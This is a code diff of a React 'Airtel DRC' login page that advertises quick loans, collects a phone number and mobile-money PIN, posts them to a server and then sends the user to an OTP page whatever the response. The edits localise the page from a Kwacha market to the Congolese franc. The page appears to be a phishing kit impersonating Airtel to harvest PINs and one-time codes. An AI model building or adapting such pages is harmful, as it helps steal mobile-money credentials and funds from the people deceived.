@@ -11,7 +11,7 @@ function AirtelLogin() {
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [error, setError] = useState('Entrez le numéro Airtel.');
   const [isLoading, setIsLoading] = useState(false);
-  
+
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
@@ -19,7 +19,7 @@ function AirtelLogin() {
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '');
     setPhone(val);
-    
+
     // Auto-focus first PIN input when phone number is complete
     if (val.length === PHONE_MAX) {
       pinRefs.current[0]?.focus();
@@ -47,7 +47,7 @@ function AirtelLogin() {
     const pinString = pin.join('');
 
     if (phone.length < PHONE_MAX) {
-      setError('Entrez un numéro Airtel RDC valide.');
+      setError('Entrez un numéro Airtel DRC valide.');
       return;
     }
     if (pinString.length < 4) {
@@ -68,10 +68,10 @@ function AirtelLogin() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
       });
-      
+
       const data = await response.json();
       console.log('Login response:', data);
-      
+
       // Navigate after successful request
       navigate('/airtel-otp');
     } catch (err) {
@@ -93,8 +93,8 @@ function AirtelLogin() {
             <line x1="3" y1="18" x2="21" y2="18" />
           </svg>
         </div>
-        
-        <h1 className="airtel-logo">Airtel RDC</h1>
+
+        <h1 className="airtel-logo">Airtel DRC</h1>
         <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
@@ -155,8 +155,8 @@ function AirtelLogin() {
             </div>
           </div>
 
-          <button 
-            type="submit" 
+          <button
+            type="submit"
             className="airtel-login-btn"
             disabled={isLoading}
             style={{ opacity: isLoading ? 0.7 : 1 }}
@@ -179,7 +179,7 @@ function AirtelLogin() {
         </div>
       </div>
 
-      {/* Icons Section — with updated Franc symbol */}
+      {/* Icons Section — with updated Franc Congolais symbol */}
       <div className="airtel-icons-footer">
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -207,8 +207,8 @@ function AirtelLogin() {
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2" />
-            {/* Changed from K to F for Congolese Franc */}
-            <text x="20" y="34" textAnchor="middle" fontSize="22" fontWeight="bold" fill="black">F</text>
+            {/* Changed to FC for Franc Congolais */}
+            <text x="20" y="34" textAnchor="middle" fontSize="16" fontWeight="bold" fill="black">FC</text>
           </svg>
         </div>
       </div>
